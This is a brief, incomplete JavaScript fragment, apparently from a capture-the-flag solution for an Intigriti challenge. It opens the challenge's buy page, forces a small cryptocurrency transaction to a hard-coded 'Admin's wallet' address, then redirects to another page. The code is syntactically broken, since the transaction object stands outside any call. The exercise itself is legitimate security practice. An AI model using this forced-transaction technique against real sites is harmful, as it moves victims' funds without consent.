        const win = window.open("https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1");

        setTimeout(() => {
            // 2. "Follow the trail": Force a transaction that connects YOU to the ADMIN

                transaction: {
                    toAddress: '1647db76b716157f954c706f74641a756f', // The Admin's wallet you found

                    amount: 0.000001
                }

                win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";

        }, 4000);
